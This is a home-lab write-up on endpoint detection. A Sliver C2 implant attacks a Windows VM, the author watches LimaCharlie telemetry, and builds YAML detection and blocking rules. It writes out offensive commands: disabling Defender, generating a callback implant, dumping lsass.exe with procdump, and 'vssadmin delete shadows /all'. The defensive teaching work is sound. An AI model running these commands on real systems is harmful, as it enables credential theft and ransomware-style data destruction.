# *End Point Detection and Response Lab*

![Logo Bar](https://i.imgur.com/iePpCDH.png)

## Introduction

For this Lab I created a simple virtual envrionment using two VMware virtual machines and LimaCharlie end point detection and response (EDR). I added a sensore to ingest log data from our target VM, dropped a C2 payload created with Sliver, observed telemetry from the EDR, detected adversarial movements, and crafted detection and response rules.


## Architecture

The architecture of this lab consists of the following components:

- Windows 11 Virtual Machine (VMware)
- Ubuntu Server Virtual Machine (VMware)
- PuTTY SSH Client
- LimaCharlie End Point Detection and Response
- Sysmon


## Set up the virtual environment

1. *Download and install VMware Workstation Pro 17*
    - I chose to buy the Pro version instead of the free trial since I plan on utilizing it a lot more in the future
2. *Download and deploy a VMware evalustion version of Windows 11 from Microsoft*
3. *Download and install Ubuntu Server 22.04.1*
    - This specific versio of Ubuntu comes with the necessary packages preinstalled.
    - During the install process manually set the ipv4 address of the Ubuntu server so the IP address doesn't change during the lab
4. *Set up the Windows VM*
    - Disable Tamper Protection
    - Permanently disable Defender via the Group Policy Editor
    - Permanently disable Defender via Registry
    - Prevent the VM from going into standby via command prompt
      ![Disable Standby](https://i.imgur.com/zRszk5m.png)
    - Install Sysmon
    - Validate Sysmon is installed and running via Powershell with Get-Service sysmon64
      ![Validate](https://i.imgur.com/A2hozsA.png)
    - Check for presence of Sysmon Event logs
      ![Event Logs](https://i.imgur.com/VTBPH23.png)
    - Create a snapshot of the Winows VM to return to a clean point
5. *Install LimaCharlie EDR on Windows VM*
    - Create a free account with LimaCharlie and then create an organization with the Extended Detection and Response Standard template
    - Add a sensor. These are the primary input for data into LimaCharlie
      ![Add Sensor](https://i.imgur.com/ao00dka.png)
    - Download the sensore with Invoke-WebRequest in Powershell then install the sensor on our Endpoint via the Command Prompt.
      ![Add Sensor](https://i.imgur.com/vGFOpHH.png)
    - The new sensor is confirmed to be reporting in at this point.
    - Now we need to configure LimaCharlie to ship the Sysmon Event Logs along with its own telemetry
6. *Set up the Attack System (Our Ubuntu Server)*
    - Use PuTTY to access our Ubuntu VM through SSH
    - Move to root with "sudo su" command
    - Download Sliver command and control framework
    - Create a working directory for Sliver with mkdir command (mkdir -p /opt/sliver).
    - Once Sliver is installed into our new directory we can move to it and launch Sliver
    - Generate our payload once inside of Sliver with this command line "generate --http [Linux_VM_IP] --save /opt/sliver"
      ![Sliver](https://i.imgur.com/QSA7EuP.png)
    - Create a temporary web server with python (python3 -m http.server 80), then downlaod the payload on the Windows machine via Powershell

## Work The Lab

1. *Start a Command and Control Session*
    - After relaunching Sliver start an http listener in the console with the command "http"
    - Back on the Wndows VM I will just manually execute our C2 implant.exe within an administrative Powershell
    - We should see our C2 session appear in the Sliver console
      ![Sliver](https://i.imgur.com/9WzEhqH.png)
    - Entering the "session" command into the Sliver console we can take note of our session ID.
    - Next we can interact with our C2 session by using the command "use [session_id]" in the Sliver console
    - Now we can start exploring our windows system with some simple commands like "info", "whoami", and "getprivs", then identify our working directory with "pwd" and examine network conncetions with "netstat"
    - If we run the command "ps -t" we can view running processes on the Windows system and note how Sliver will highlight it's own processes in green and detect defensive tools in red. This is a good example of how attackers can become aware of defensive tools a victim might be using
      ![Sliver](https://i.imgur.com/9qPc4Km.png)
2. *Observer Some EDR Telemetry*
    - Now we can hop into the LimaCharlie UI and check out some of the telemetry that has been collected from our end point
    - First look at some processes and spend some time exploring. Take note that LimaCharlie does a nice job of showing processes that are signed and ones that are not. A process that carries a valid signature is often going to be benign itself, although legitimate processes can be used to launch a malicious process or code. Below shows our payload as an unsigned processs (missing the green check) as well as an indicator that it is "listening".
       ![Sliver](https://i.imgur.com/cKMLdR0.png)
    - We can also view network connections from here and identify the destination IP this our payload process is communicating with
      ![Network Connection](https://i.imgur.com/rwyIODK.png)
    - Next we can explore the File System through Lima and find our payload in the downloads section. From there we can search the file hash in Virustotal although there is nothing found as we just created a new payload. This is a good time for a lesson, just because a hash is not found on Virustotal it does not mean that it is innocent.
    - We continue to explore through LimaCharlie and learn what it can show us and how we can further use the information to investigate as well as start to build detection and response.
3. *Perform Some Adversarial Actions*
    - Let's run a "getprivs" command and see what kind of privileges we have on the compromised host (Windows VM). The primary one we are looking for is SeDebugPrivilege, if this is enbaled then we should have all the privileges we need on the system. Fortunately for this lab we know we have this because we executed the payload in the Windows VM with administrative rights. Let's check it anyway.
       ![getprivs](https://i.imgur.com/5Q7oDwF.png)
    - Now that we know we have the privileges, let's make a move that is popular for stealingf credentials and dump the lsass.exe process from memory. Use the command "procdump -n lsass.exe -s lsass.dmp". This will dump the process from memory and save it locally on the C2 server. This step is really only done to detect the dump with LimaCharlie but it is also a good chance to later learn more about how this technique is used and try it for ourselves.
4. *Let's Detect*
    - We've done something malicious, now let's switch to Lima and examine it. Since lsass.exe is a sensitive process that is targeted by credential targeting tools, any good EDR will generate events for it.
    - Looking into the Timeline of the Windows VM in Lima we can filter for SENSITIVE_PROCESS_ACCESS events. For this lab there won't be much on the system that is legitimately accessing lsass so we can be assured that the events we see are from our procdump.
      ![lsass](https://i.imgur.com/meZi60L.png)
    - Knowing what the event looks like when credential access occurs we can use that information to create a detection and response rule in Lima which would alert us anytime actvity that matches occurs. The rules in Lima are written in YAML. Breaking the below rule down. First we have the detection portion of the rule: look for event type SENSITIVE_PROCESS_ACCESS (event) which ends with (op) lsass.exe (value) in the given (path). This rule as is very noisy in a real world scenario but for simplicity in this lab it works. The second part of the rule is the response which is a simple alert. We call out an (action) to report and the (name) should be LSASS access.
      ![lsassrule](https://i.imgur.com/4GVAxYP.png)
    - After putting the bad actor hat on once again and running our proc dump, we can go back to Lima and look at the Detections tab. Here we now see our newly created LSASS access detection rule reporting in after another credential access attempt
      ![lsassdetect](https://i.imgur.com/7q8K58D.png)
    - These last few steps have given us the framework to go and explore, seeing what more we can do with the C2 and what other rules we can craft as well as tune. I will surely be playing more with these in the near future and update this project but for now let's move on to a couple more attacks and rules, even throwing in some attack blocking!
5. *Blocking Attacks with EDR*
    - The most critical aspect of blocking with EDr certainly seems to be baselining the environment. False positives with a blocking rule in effect are far different than a simply alert which you can investigate while the enviroment goes along on it's merry way. Now we are talking abouta rule that can stop processes and cause real problems if it's just firing off on a mutlitude of false positives.
    - The rule we are going to create for this step involves Volume Shadow Copies. Volume shadow copies provide and eay way to restore files or a file system. This is one of the most attractive options for recovering from a ransomware attack and thus makes the deletion of the volume shadow copies a good sign of a ransomware attack.
    - We'll use a basic command to delete these "vssadmin delete shadows /all". This command is a good candidate for a blocking rule as it has low false positive rates and a high threat activity indicator. It's not a command that is commonly run in a healthy environment.
    - As in the past exercise we'll execute this commmand with our C2 session so we can later use its process in Lima to craft a detection and response rule.
    - After running the command on our C2 server, we jump back into the Lima Detection tab. The default Sigma rules should already have picked up on this activity which can be seen below.
      ![shadowcopies](https://i.imgur.com/lpybkfc.png)
    - Clicking on View Event Timeline we can quickly move to building a new detection and response rule. The detection portion of the rule is created automatically by Lima then we add the Response. The rule simply says when you see this then kill the parent process. Here is what the rule looks like:
      ![shadowrule1](https://i.imgur.com/xZwtJHL.png)
    - In a ransomware scenario this rule would eb effective because the parent process is liekly the payload or lateral movement which would be terminated.
    - There is however another and better way of writing this rule. the current rules relies on a literal matching of the string "vssadmin delete shadows /all". The weakness here is that even an extra space somewhere will break the rule. Taking this into consideration we can use the "contains" operator. This will avoid the literal issue.
      ![shadowrule1](https://i.imgur.com/FOmYnYo.png)
    - Lastly we'll put the new rule to the test with Florian's ransomware simulator. The simulator works by simply copying itself to WORD.exe. WORD.exe then simulates a macro-enabled document execution which is followed by deleting volume shadow copies. Next it creates 10,000 files and encrypts them. Considering this it should be apparent where our detection and response should break this ransomware. The image below is from Lima Detections and we can see first that the Sigma rule picked up on the shadow copies deletion then immediately our custom detection and response kills the parent process. This results in the file creation and encryption never occuring.
      ![shadowrule2](https://i.imgur.com/pwZzPFo.png)
      ![shadowrule2](https://i.imgur.com/QWKZ7UX.png)


## Conclusion


In this End Point Detection and Response (EDR) lab, we have successfully set up a virtual environment comprising Windows 11 and Ubuntu Server virtual machines. We integrated LimaCharlie as our EDR solution to monitor and respond to potential threats. The lab involved several key steps:

1. **Virtual Environment Setup**: We configured our virtual environment using VMware Workstation Pro, installed Windows 11 and Ubuntu Server, and made necessary configurations on the Windows VM, including disabling security features and installing Sysmon.

2. **LimaCharlie EDR Integration**: We set up LimaCharlie by creating an account, organization, and sensor to ingest data from our endpoint. This allowed us to monitor the Windows VM for suspicious activity.

3. **Command and Control**: We initiated a command and control session using the Sliver framework on the Ubuntu Server to gain control of the Windows VM. We explored the compromised system, demonstrating how attackers can identify potential security tools.

4. **Observing EDR Telemetry**: We examined the telemetry data collected by LimaCharlie, focusing on processes, network connections, and file system activity. This highlighted the importance of monitoring for potentially malicious behavior.

5. **Adversarial Actions**: We conducted adversarial actions, such as dumping the lsass.exe process from memory, to simulate malicious activities. We then utilized LimaCharlie to detect and respond to these actions.

6. **Creating Detection Rules**: We crafted detection rules in LimaCharlie, using YAML, to identify specific events or behaviors indicative of potential threats. This included rules for detecting sensitive process access and malicious actions.

7. **Blocking Attacks with EDR**: We explored the concept of blocking attacks with EDR and created a rule to block the deletion of Volume Shadow Copies, a common indicator of ransomware activity. We demonstrated how this rule could effectively halt ransomware execution.

Overall, this lab provided valuable insights into the capabilities of an EDR solution like LimaCharlie and the importance of monitoring, detection, and response in securing endpoints against various threats. It showcased the process of setting up a lab environment, conducting adversarial actions, and leveraging EDR to enhance security.
       

    
      
      
      
      
      
   





